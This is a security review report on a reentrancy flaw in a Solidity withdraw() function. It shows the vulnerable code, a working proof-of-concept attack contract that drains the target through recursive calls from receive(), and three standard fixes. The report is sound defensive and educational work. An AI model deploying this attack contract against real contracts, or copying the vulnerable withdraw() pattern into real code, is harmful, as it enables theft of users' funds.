# Smart Contract Security Review

## Vulnerability Report

### Title
Reentrancy Vulnerability in `withdraw()` Function  

### Severity
Critical  

### Category
Reentrancy / Unsafe External Call  

---

## Summary

The contract allows users to donate Ether and later withdraw their balances. However, the `withdraw()` function performs an external call to the user’s address **before** updating the user's internal balance in the mapping.

This enables a malicious contract to recursively call `withdraw()` through its `receive()` or `fallback()` function. Because the balance is not yet reduced, each recursive call passes the balance check, allowing the attacker to drain the entire contract's ETH balance.

---

## Intended Functionality

The contract is designed to:
- Accept ETH donations and track them per user.
- Maintain a `balances` mapping to ensure users only withdraw what they own.
- Allow users to retrieve their funds.

```solidity
function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
        // VULNERABLE EXTERNAL CALL
        (bool result,) = msg.sender.call{value:_amount}("");
        if(result) {
            _amount;
        }
        // STATE UPDATE HAPPENS TOO LATE
        balances[msg.sender] -= _amount;
    }
}
```

---

## Root Cause

The root cause is the violation of the **Checks-Effects-Interactions (CEI)** pattern.

1.  **Check:** The contract checks if the user has enough balance (`if(balances[msg.sender] >= _amount)`).
2.  **Interaction:** The contract performs an external call to send Ether (`msg.sender.call`).
3.  **Effect:** The contract updates the state (`balances[msg.sender] -= _amount`).

Because the **Interaction** happens before the **Effect**, the control flow is handed over to the `msg.sender` while the internal state still shows the user has a full balance.

---

## Impact

- **Total Fund Drain:** An attacker can steal the entire balance of the contract, not just their own deposit.
- **Protocol Insolvency:** Legitimate users lose all their deposited funds.
- **State Inconsistency:** The mapping no longer reflects the actual ETH held by the contract.

---

## Proof of Concept (PoC)

An attacker uses a malicious contract to trigger recursive calls:

```solidity
contract ReentrancyAttack {
    Reentrance target;
    uint public amount;

    constructor(address payable _target) public {
        target = Reentrance(_target);
    }

    // Step 1: Donate to pass the balance check
    function attack() external payable {
        amount = msg.value;
        target.donate{value: amount}(address(this));
        // Step 2: Trigger the first withdraw
        target.withdraw(amount);
    }

    // Step 3: Receive logic executes while target is mid-transaction
    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount);
        }
    }
}
```

**Execution Flow:**
1.  Attacker calls `attack()` with 1 ETH.
2.  `Reentrance` contract calls `ReentrancyAttack.receive()`.
3.  `receive()` calls `withdraw()` again. The `Reentrance` balance for the attacker is still 1 ETH.
4.  The loop continues until `Reentrance` is empty.

---

## Why This Is Critical

Reentrancy is historically the most devastating vulnerability in smart contract history.
-   **The DAO Hack:** In 2016, a reentrancy exploit resulted in the loss of 3.6 million ETH (leading to the Ethereum/Ethereum Classic hard fork).
-   **Modern Relevance:** Despite being a "known" issue, it remains a frequent cause of multi-million dollar DeFi hacks in complex cross-contract interactions.

---

## Recommended Remediations 

### ✔ Fix 1: Follow Checks–Effects–Interactions (Best Practice)
Always update internal state (balances, flags) **before** making any external calls.

```solidity
function withdraw(uint _amount) public {
    require(balances[msg.sender] >= _amount);

    // Update state first
    balances[msg.sender] -= _amount;

    // Interaction last
    (bool result,) = msg.sender.call{value:_amount}("");
    require(result, "Transfer failed");
}
```

### ✔ Fix 2: Use a Reentrancy Guard
Implement a "mutex" lock that prevents a function from being entered again while it is still executing.

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeContract is ReentrancyGuard {
    function withdraw(uint _amount) public nonReentrant {
        // logic...
    }
}
```

### ✔ Fix 3: Use the Pull Payment Pattern
Separate the logic of "calculating a reward/balance" from the "sending of ETH." Allow users to initiate their own withdrawals in a dedicated, isolated function.